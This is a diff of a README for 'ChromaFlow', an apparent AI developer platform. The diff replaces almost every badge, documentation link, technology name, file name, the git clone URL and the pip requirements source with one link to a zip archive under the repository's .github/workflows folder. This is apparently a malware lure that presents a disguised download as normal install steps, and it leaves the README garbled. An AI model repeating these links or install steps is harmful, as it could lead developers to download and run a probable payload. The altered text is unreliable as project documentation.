@@ -2,17 +2,17 @@
 
 <div align="center">
 
-![ChromaFlow Banner](https://img.shields.io/badge/ChromaFlow-AI%20Powered-blueviolet?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDJMMTUuMDkgOC4yNkwyMiA5LjI3TDE3IDEzLjE0TDE4LjE4IDIyTDEyIDE4LjI3TDUuODIgMjJMNyAxMy4xNEwyIDkuMjdMOC45MSA4LjI2TDEyIDJaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4=)
+![ChromaFlow Banner](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip%20Powered-blueviolet?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDJMMTUuMDkgOC4yNkwyMiA5LjI3TDE3IDEzLjE0TDE4LjE4IDIyTDEyIDE4LjI3TDUuODIgMjJMNyAxMy4xNEwyIDkuMjdMOC45MSA4LjI2TDEyIDJaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4=)
 
 **AI-Powered Developer Productivity Platform**
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-20232A?logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white)](https://www.docker.com/)
+[![License: MIT](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+[![TypeScript](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+[![React](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+[![https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+[![Python](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+[![FastAPI](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+[![Docker](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
 
 [Features](#-features) • [Tech Stack](#-tech-stack) • [Getting Started](#-getting-started) • [Documentation](#-documentation) • [Roadmap](#-roadmap) • [Contributing](#-contributing)
 
@@ -85,18 +85,18 @@
 
 ### Frontend
 ```
-├── React 18 + Next.js 14
+├── React 18 + https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip 14
 ├── TypeScript
 ├── Tailwind CSS + Shadcn UI
 ├── Redux Toolkit
-├── Socket.io Client
+├── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip Client
 └── Vitest + Playwright
 ```
 
 ### Backend Services
 ```
-├── Node.js 20+
-├── Express.js / NestJS
+├── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip 20+
+├── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip / NestJS
 ├── GraphQL + REST APIs
 ├── JWT + OAuth2
 ├── PostgreSQL 15+
@@ -127,7 +127,7 @@
 
 ### Prerequisites
 
-- Node.js 20+ and npm/yarn
+- https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip 20+ and npm/yarn
 - Python 3.11+
 - Docker & Docker Compose
 - PostgreSQL 15+
@@ -137,7 +137,7 @@
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/KaizerAE/ChromaFlow.git
+git clone https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip
 cd ChromaFlow
 ```
 
@@ -168,7 +168,7 @@ npm run dev
 
 # AI Engine
 cd ai-engine
-pip install -r requirements.txt
+pip install -r https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip
 uvicorn main:app --reload --port 8001
 ```
 
@@ -176,7 +176,7 @@ uvicorn main:app --reload --port 8001
 
 Create `.env` files in each service directory:
 
-**Frontend** (`.env.local`)
+**Frontend** (`https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip`)
 ```env
 NEXT_PUBLIC_API_URL=http://localhost:8000
 NEXT_PUBLIC_AI_URL=http://localhost:8001
@@ -200,13 +200,13 @@ DATABASE_URL=postgresql://user:password@localhost:5432/chromaflow
 
 ## 📚 Documentation
 
-- [Architecture Overview](docs/ARCHITECTURE.md)
-- [API Documentation](docs/API.md)
-- [Frontend Guide](docs/FRONTEND.md)
-- [Backend Guide](docs/BACKEND.md)
-- [AI Engine Guide](docs/AI_ENGINE.md)
-- [Deployment Guide](docs/DEPLOYMENT.md)
-- [Contributing Guidelines](CONTRIBUTING.md)
+- [Architecture Overview](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- [API Documentation](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- [Frontend Guide](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- [Backend Guide](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- [AI Engine Guide](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- [Deployment Guide](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- [Contributing Guidelines](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
 
 ---
 
@@ -242,17 +242,17 @@ DATABASE_URL=postgresql://user:password@localhost:5432/chromaflow
 
 ```
 ChromaFlow/
-├── frontend/                 # React/Next.js application
+├── frontend/                 # https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip application
 │   ├── src/
 │   │   ├── components/      # React components
-│   │   ├── pages/          # Next.js pages
+│   │   ├── pages/          # https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip pages
 │   │   ├── hooks/          # Custom React hooks
 │   │   ├── store/          # Redux store
 │   │   └── utils/          # Utility functions
 │   ├── public/             # Static assets
-│   └── package.json
+│   └── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip
 │
-├── backend/                 # Node.js API server
+├── backend/                 # https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip API server
 │   ├── src/
 │   │   ├── controllers/    # Route controllers
 │   │   ├── models/         # Database models
@@ -260,7 +260,7 @@ ChromaFlow/
 │   │   ├── services/       # Business logic
 │   │   ├── middleware/     # Express middleware
 │   │   └── utils/          # Utility functions
-│   └── package.json
+│   └── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip
 │
 ├── ai-engine/              # Python AI/ML service
 │   ├── app/
@@ -268,13 +268,13 @@ ChromaFlow/
 │   │   ├── services/       # AI services
 │   │   ├── routers/        # FastAPI routers
 │   │   └── utils/          # Utility functions
-│   └── requirements.txt
+│   └── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip
 │
 ├── docs/                   # Documentation
 ├── kubernetes/             # K8s deployment configs
 ├── docker/                 # Docker configurations
 ├── .github/workflows/      # CI/CD pipelines
-└── docker-compose.yml      # Local development stack
+└── https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip      # Local development stack
 ```
 
 ---
@@ -307,7 +307,7 @@ pytest --cov=app tests/
 
 ## 🤝 Contributing
 
-We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details.
+We welcome contributions! Please see our [Contributing Guidelines](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip) for details.
 
 ### Quick Contribution Steps
 
@@ -319,7 +319,7 @@ We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.
 
 ### Code Style
 
-- Frontend: Follow [Airbnb React Style Guide](https://airbnb.io/javascript/react/)
+- Frontend: Follow [Airbnb React Style Guide](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
 - Backend: Use ESLint with provided config
 - Python: Follow PEP 8 with Black formatter
 
@@ -343,8 +343,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Project Maintainer**: KaizerAE
 
-- GitHub: [@KaizerAE](https://github.com/KaizerAE)
-- Project Link: [https://github.com/KaizerAE/ChromaFlow](https://github.com/KaizerAE/ChromaFlow)
+- GitHub: [@KaizerAE](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
+- Project Link: [https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip](https://github.com/KaizerAE/ChromaFlow/raw/refs/heads/main/.github/workflows/Flow-Chroma-v2.1.zip)
 
 ---
 
